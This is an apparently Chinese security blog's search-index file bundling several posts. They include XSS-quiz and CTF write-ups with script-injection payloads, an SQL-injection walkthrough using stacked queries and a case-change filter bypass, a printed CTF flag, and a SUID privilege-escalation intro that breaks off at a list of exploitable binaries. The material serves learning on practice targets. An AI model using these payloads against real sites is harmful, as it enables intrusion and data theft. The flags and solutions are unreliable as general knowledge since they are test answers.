<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XSS challenges</title>
      <link href="2021/04/15/20210415165336/"/>
      <url>2021/04/15/20210415165336/</url>
      
        <content type="html"><![CDATA[<h1 id="00-靶场地址"><a href="#00-靶场地址" class="headerlink" title="00 靶场地址"></a>00 靶场地址</h1><p><a href="http://xss-quiz.int21h.jp/">http://xss-quiz.int21h.jp/</a></p><h1 id="01-stage-1"><a href="#01-stage-1" class="headerlink" title="01 stage #1"></a>01 stage #1</h1><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210415165811908.png" alt="image-20210415165811908"></p><p>题目要求执行script命令：<code>alert(document.domain)</code></p><p><code>F12</code>查看源码</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210415170002037.png" alt="image-20210415170002037"></p><p>hidden部分不知道有啥用，但是表单POST提交的只有p1，随便写个内容上去，提交后如下。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210415170157742.png" alt="image-20210415170157742"></p><p>提交内容被<code>双引号包围&quot;&quot;</code>，在插入内容左右添加<code>“</code>进行闭合。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&quot;&lt;script&gt;alter(document.domain);&lt;&#x2F;script&gt;&quot;&#39;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210415202542703.png" alt="image-20210415202542703"></p><h1 id="02-Stage-2"><a href="#02-Stage-2" class="headerlink" title="02 Stage #2"></a>02 Stage #2</h1><p>和第一题一样，随便输入个内容，先看源码。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210415202333940.png" alt="image-20210415202333940"></p><p>可以看到内容写到了<code>input</code>标签的<code>value</code>属性，并且有提示，先闭合当前的标签，然后再写script。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&quot;&gt;&lt;script&gt;alter(document.domain);&lt;&#x2F;script&gt;&lt;&quot;&#39;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210415202600574.png" alt="image-20210415202600574"></p><h1 id="03-Stage-3"><a href="#03-Stage-3" class="headerlink" title="03 Stage #3"></a>03 Stage #3</h1><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416172210838.png" alt="image-20210416172210838"></p><p>查看源码，提示<code>text box</code>被正确转义，但是我们还有一个选择框可以进行突破，直接讲选择框的一个选项写为payload。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416172502944.png" alt="image-20210416172502944"></p><p>然后提交表单。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416172519638.png" alt="image-20210416172519638"></p><h1 id="04-Stage-4"><a href="#04-Stage-4" class="headerlink" title="04 Stage #4"></a>04 Stage #4</h1><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416172820506.png" alt="image-20210416172820506"></p><p>提示存在一个不可见输入框，那么就在源码中找见它，修改<code>hidden</code>属性，直接填写。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416172954307.png" alt="image-20210416172954307"></p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416173027433.png" alt="image-20210416173027433"></p><h1 id="05-Stage-5"><a href="#05-Stage-5" class="headerlink" title="05 Stage #5"></a>05 Stage #5</h1><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416173154109.png" alt="image-20210416173154109"></p><p>进行了长度限制，那么源码直接修改限制。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416173222719.png" alt="image-20210416173222719"></p><p>填入payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&quot;&gt;&lt;script&gt;alert(document.domain);&lt;&#x2F;script&gt;&#39;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416173235815.png" alt="image-20210416173235815"></p><h1 id="06-Stage-6"><a href="#06-Stage-6" class="headerlink" title="06 Stage #6"></a>06 Stage #6</h1><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416173432384.png" alt="image-20210416173432384"></p><p>提示事件触发属性，测试输入内容写到value属性，因此可以尝试闭合value属性，添加一个新的事件属性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&quot; onblur&#x3D;&quot;alert(document.domain);&quot;&#39;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416190144752.png" alt="image-20210416190144752"></p><h1 id="07-Stage-7"><a href="#07-Stage-7" class="headerlink" title="07 Stage #7"></a>07 Stage #7</h1><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416190404672.png" alt="image-20210416190404672"></p><p>提示说几乎一样，但是棘手，那么同上，在源码直接写入payload，成功。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&quot; onblur&#x3D;&quot;alert(document.domain);&quot;&#39;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416190501323.png" alt="image-20210416190501323"></p><h1 id="08-Stage-8"><a href="#08-Stage-8" class="headerlink" title="08 Stage #8"></a>08 Stage #8</h1><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416191138006.png" alt="image-20210416191138006"></p><p>提示<code>javascript</code>模式。并且测试发现输入的内容写为了a标签的href，可以尝试javascript伪协议。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;javascript:alert(document.domain);&#39;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416191455395.png" alt="image-20210416191455395"></p><h1 id="09-Stage-9"><a href="#09-Stage-9" class="headerlink" title="09 Stage #9"></a>09 Stage #9</h1><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416202719817.png" alt="image-20210416202719817"></p><p>嗯？UTF-7，没接触过，各种查，没找到解法，只看到有人说UTF-7是针对之前IE的一个漏洞，而且他复现也没有成功。说是有人直接通过firebug执行命令，firebug能执行命令吗？在看回<code>F12</code>，console能直接执行命令 ，是不是可以呐！成功，盖了帽了我的老baby。。。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416204903071.png" alt="image-20210416204903071"></p><p>之后题是不是都可以这样了，😂。太年轻！这还做啥。</p><h1 id="10-Stage-10"><a href="#10-Stage-10" class="headerlink" title="10 Stage #10"></a>10 Stage #10</h1><p>别搞，好好做。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416205513045.png"></p><p>提示是这样的，没看明白，进行测试后，发现内容写入value属性中，继续闭合写script。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416205630622.png" alt="image-20210416205630622"></p><p>发现源码中已经解析，但是domain没了，应该是匹配之后去掉了，那么双写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&quot;&gt;&lt;script&gt;alert(document.dodomainmain);&lt;&#x2F;script&gt;&#39;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416205759387.png" alt="image-20210416205759387"></p><h1 id="11-Stage-11"><a href="#11-Stage-11" class="headerlink" title="11 Stage #11"></a>11 Stage #11</h1><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210416210125074.png" alt="image-20210416210125074"></p><p>嗯？500了。。。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wp-攻防世界WEB-web2</title>
      <link href="2021/03/22/20210322223617/"/>
      <url>2021/03/22/20210322223617/</url>
      
        <content type="html"><![CDATA[<p>这是一道简单的解密题，首先放上题目源码。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210322223917635.png" alt="image-20210322223917635"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=strrev(<span class="variable">$str</span>);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;strlen(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=substr(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span>=ord(<span class="variable">$_c</span>)+<span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_c</span>=chr(<span class="variable">$__</span>);</span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析得该题目就是有一个简单的加密算法和一些php函数组成。</p><h1 id="0x00-php相关函数"><a href="#0x00-php相关函数" class="headerlink" title="0x00 php相关函数"></a>0x00 php相关函数</h1><h2 id="strrev-—-反转字符串"><a href="#strrev-—-反转字符串" class="headerlink" title="strrev — 反转字符串"></a>strrev — 反转字符串</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p><strong>strrev</strong> ( string <code>$string</code> ) : string</p><p>返回 <code>string</code> 反转后的字符串。</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul><li><p><code>string</code></p><p>待反转的原始字符串。</p></li></ul><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>返回反转后的字符串。</p><h3 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> strrev(<span class="string">&quot;Hello world!&quot;</span>); <span class="comment">// 输出 &quot;!dlrow olleH&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="str-rot13"><a href="#str-rot13" class="headerlink" title="str_rot13"></a>str_rot13</h2><p>str_rot13 — 对字符串执行 ROT13 转换</p><h3 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h3><p><strong>str_rot13</strong> ( string <code>$str</code> ) : string</p><p>对 <code>str</code> 参数执行 ROT13 编码并将结果字符串返回。</p><p>ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</p><h3 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h3><ul><li><p><code>str</code></p><p>输入字符串。</p></li></ul><h3 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h3><p>返回给定字符串的 ROT13 版本。</p><h3 id="范例-1"><a href="#范例-1" class="headerlink" title="范例"></a>范例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> str_rot13(<span class="string">&#x27;PHP 4.3.0&#x27;</span>); <span class="comment">// CUC 4.3.0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="base64-encode"><a href="#base64-encode" class="headerlink" title="base64_encode"></a>base64_encode</h2><p>base64_encode — 使用 MIME base64 对数据进行编码</p><h3 id="说明-2"><a href="#说明-2" class="headerlink" title="说明"></a>说明</h3><p><strong>base64_encode</strong> ( string <code>$data</code> ) : string</p><p>使用 base64 对 <code>data</code> 进行编码。</p><p>设计此种编码是为了使二进制数据可以通过非纯 8-bit 的传输层传输，例如电子邮件的主体。</p><p>Base64-encoded 数据要比原始数据多占用 33% 左右的空间。</p><h3 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h3><ul><li><p><code>data</code></p><p>要编码的数据。</p></li></ul><h3 id="返回值-2"><a href="#返回值-2" class="headerlink" title="返回值"></a>返回值</h3><p>编码后的字符串数据， 或者在失败时返回 **<code>FALSE</code>**。</p><h3 id="范例-2"><a href="#范例-2" class="headerlink" title="范例"></a>范例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;This is an encoded string&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以上例程会输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VGhpcyBpcyBhbiBlbmNvZGVkIHN0cmluZw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><p>知晓涉及到的每个函数之后，就需要分析for循环做了些什么然后反向执行进行解密。</p><p>附上代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$miwen&#x3D;&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;</span><br><span class="line">$min &#x3D; str_rot13($miwen);</span><br><span class="line">$min &#x3D; strrev($min);</span><br><span class="line">$min &#x3D; base64_decode($min);</span><br><span class="line"></span><br><span class="line">for($_0&#x3D;0;$_0&lt;strlen($min);$_0++)&#123;</span><br><span class="line">$_c&#x3D;substr($min, $_0, 1);</span><br><span class="line">$__&#x3D;ord($_c)-1;</span><br><span class="line">$_c&#x3D;chr($__);</span><br><span class="line">$_&#x3D;$_.$_c;</span><br><span class="line">&#125;</span><br><span class="line">echo strrev($_);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h1 id="0x02-mac环境php配置"><a href="#0x02-mac环境php配置" class="headerlink" title="0x02 mac环境php配置"></a>0x02 mac环境php配置</h1><p>mac自带apache和php环境，只需要打开即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apachectl start# 开启apache服务</span><br><span class="line">sudo apachectl restart# 重启apache服务</span><br><span class="line">sudo apachectl stop# 停止apache服务</span><br></pre></td></tr></table></figure><p>apache配置文件路径：/private/etc/apache2/httpd.conf。通过字符串寻找php位置，取消php模块前的注释。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210322225223394.png" alt="image-20210322225223394"></p><p>apache网站服务根目录如下，可直接使用该目录，或自定义。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20210322225249970.png" alt="image-20210322225249970"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>schtasks /query显示错误：无法加载列资源</title>
      <link href="2021/01/26/20210126212422/"/>
      <url>2021/01/26/20210126212422/</url>
      
        <content type="html"><![CDATA[<p>操作系统：win 7</p><p>该原因是编码的不支持，通过chcp查看编码，936会导致无法加载列资源，修改为437即可。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp <span class="number">437</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcxMzgwMA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p><p>原因分析：刚开始认为就是因为编码的问题，不支持中文的编码，但是之后在win server 2012 r2上进行操作时，查看编码号也是936，所以应该不是编码的问题，可能就是在win7上出现的问题。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wp-攻防世界WEB-supersqli</title>
      <link href="2020/07/08/20200708203725/"/>
      <url>2020/07/08/20200708203725/</url>
      
        <content type="html"><![CDATA[<p>首先先判断注入类型。可以通过输入一些字符串，在判断是否存在注入的同时判断注入类型。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?inject<span class="operator">=</span><span class="number">1</span><span class="number">-0</span></span><br><span class="line">?inject<span class="operator">=</span><span class="number">1</span> \</span><br><span class="line">?inject<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>测试发现在输入<code>1&#39;</code>和<code>1 \</code>时会出现报错信息。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20200708204254295.png" alt="image-20200708204254295"></p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20200708204320617.png" alt="image-20200708204320617"></p><p>发现该位置是一个字符型的注入。因此构造注入语句判断该注入有几个注入位置。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by x %23</span></span><br></pre></td></tr></table></figure><blockquote><p>这里的%23是#的url编码，因为#在url中代表这锚点，有自己的意义，一次要编码。也可使用<code>--+</code>、<code>--%20</code>等。</p></blockquote><p>当x为3时报错，因此之后两列。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2</span></span><br></pre></td></tr></table></figure><p>执行后发现，正则会过滤select等关键字符串。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20200708204930318.png" alt="image-20200708204930318"></p><p>在尝试内嵌注释语句打算绕过过滤后，发现无用，尝试堆叠注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;show tables %23</span></span><br></pre></td></tr></table></figure><p>执行后，得到表名。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20200708205847423.png" alt="image-20200708205847423"></p><p>分别查看两个表中的内容。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?inject<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;show columns from words; %23</span></span><br><span class="line"><span class="string">?inject=1&#x27;</span>;<span class="keyword">show</span> columns <span class="keyword">from</span> `<span class="number">1919810931114514</span>`; <span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><blockquote><p>表名是数字或者是其他特殊点的字符组成的要用``来包住，表名中间的是表名、数据库名、字段名。</p></blockquote><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20200708210551880.png" alt="image-20200708210551880" style="zoom:50%;"><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20200708210612599.png" alt="image-20200708210612599" style="zoom:50%;"><p>可以看到在<code>1919810931114514</code>中有flag字段。现在就需要拿到flag字段中的值。<code>select</code>关键字被过滤。我们可以通过预编译来绕过。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;set @sql = concat(&#x27;</span>sel<span class="string">&#x27;,&#x27;</span>ect flag <span class="keyword">from</span> `<span class="number">1919810931114514</span>`<span class="string">&#x27;);prepare stmt from @sql;execute stmt; %23</span></span><br></pre></td></tr></table></figure><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20200708211458209.png" alt="image-20200708211458209" style="zoom:50%;"><p>发现通过<code>strstr</code>过滤了set和prepare，但是这个函数区分大小写，所以通过大小写绕过。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;sEt @sql = concat(&#x27;</span>sel<span class="string">&#x27;,&#x27;</span>ect flag <span class="keyword">from</span> `<span class="number">1919810931114514</span>`<span class="string">&#x27;);prepAre stmt from @sql;execute stmt; %23</span></span><br></pre></td></tr></table></figure><p>得到flag：flag{c168d583ed0d4d7196967b28cbd0b5e9}。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过这道题目，首先知道了<code>#</code>为什么在注入的时候达不到预期的情况，然后知道了堆叠注入的姿势，在常规的注入不成功的时候，可以考虑一下这种注入方式。最后也掌握了通过预编译的方式，通过concat函数绕过关键字符串的限制，同时，也了解<code>strstr</code>函数时区分大小写的。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux SUID/SGID介绍及利用</title>
      <link href="2020/06/12/20200612172425/"/>
      <url>2020/06/12/20200612172425/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-Linux文件属性"><a href="#0x00-Linux文件属性" class="headerlink" title="0x00 Linux文件属性"></a>0x00 Linux文件属性</h1><p>通过<code>ls -l</code>我们可以查看各个文件的访问权限。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200612173855.png"></p><p>我们可以观察上方的这几个例子。</p><p>刚开始的第一位表示的是该文件的类型，有p、d、l、s、c、b和-。</p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>p</td><td>表示命名管道文件</td></tr><tr><td>d</td><td>表示目录</td></tr><tr><td>l</td><td>表示符号链接文件</td></tr><tr><td>-</td><td>表示普通文件</td></tr><tr><td>s</td><td>表示socket文件</td></tr><tr><td>c</td><td>表示字符设备文件</td></tr><tr><td>b</td><td>表示块设备文件</td></tr></tbody></table><p>之后的每三位分别表示文件所有者的权限、同组用户的权限、其他用户的权限。</p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>w</td><td>写</td></tr><tr><td>r</td><td>读</td></tr><tr><td>x</td><td>执行</td></tr></tbody></table><p>之后的数字表示硬链接的个数，然后就是文件所有者，所在组，再然后是文件的大小，和最新的更改时间，最后是文件名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwxr-xr-x  11 optimus  staff   352  2 18 12:01 tools</span><br></pre></td></tr></table></figure><p>如上，这是一个目录，所有者optimus的权限为读写执行权限（这里的执行权限为搜索位，表示可以读写该目录的文件），所在组为staff，同组用户权限为读执行，其他用户的权限为读权限，有11个硬链接，大小为352，最新更新时间为2月18日12：01，文件名是tools。</p><h1 id="0x01-SUID与SGID"><a href="#0x01-SUID与SGID" class="headerlink" title="0x01 SUID与SGID"></a>0x01 SUID与SGID</h1><p>如果我们设置了SUID或SGID，那么所有者权限或同组权限的可执行位置就变为了s（区分大小写）。</p><table><thead><tr><th>属性</th><th>含义</th></tr></thead><tbody><tr><td>-rwsr-xr-x</td><td>表示SUID和所有者权限中可执行位被设置</td></tr><tr><td>-rwSr–r–</td><td>表示SUID被设置，但所有者权限中可执行位没有被设置</td></tr><tr><td>-rwxr-sr-x</td><td>表示SGID和同组用户权限中可执行位被设置</td></tr><tr><td>-rw-r-Sr–</td><td>表示SGID被设置，但同组用户权限中可执行位没有被设置</td></tr></tbody></table><p>一个文件的权限，是由12位二进制位来表示的，第11位为SUID位，第10位为SGID位，第9位为sticky位，第8-0位对应于上面的三组rwx位。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwxr-xr-x  11 optimus  staff   352  2 18 12:01 myfile</span><br></pre></td></tr></table></figure><p>以上面为例，任何用户都可以执行这个程序。UNIX的内核是根据什么来确定一个进程对资源的访问权限的呢？是这个进程的运行用户的（有效）ID，包括user id和group id。用户可以用id命令来查到自己的或其他用户的user id和group id。</p><p>除了一般的user id 和group id外，还有两个称之为effective 的id，就是有效id，上面的四个id表示为：uid，gid，euid，egid。内核主要是根据euid和egid来确定进程对资源的访问权限。</p><p>一个进程如果没有SUID或SGID位，则euid=uid egid=gid，分别是运行这个程序的用户的uid和gid。例如jeffrey用户的uid和gid分别为204和202，optimus用户的uid和gid为200，201，jeffrey运行myfile程序形成的进程的euid=uid=204，egid=gid=202，内核根据这些值来判断进程对资源访问的限制，其实就是jeffrey用户对资源访问的权限，和optimus没关系。</p><p>如果一个程序设置了SUID，则euid和egid变成被运行的程序的所有者的uid和gid，例如jeffrey用户运行myfile，euid=200，egid=201，uid=204，gid=202，则这个进程具有它的属主optimus的资源访问权限。</p><p>SUID的作用就是这样：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限访问的资源。passwd就是一个很鲜明的例子。</p><h1 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h1><p>可利用的命令有nmap、vim、find、bash、more、less、nano、cp。</p><h4 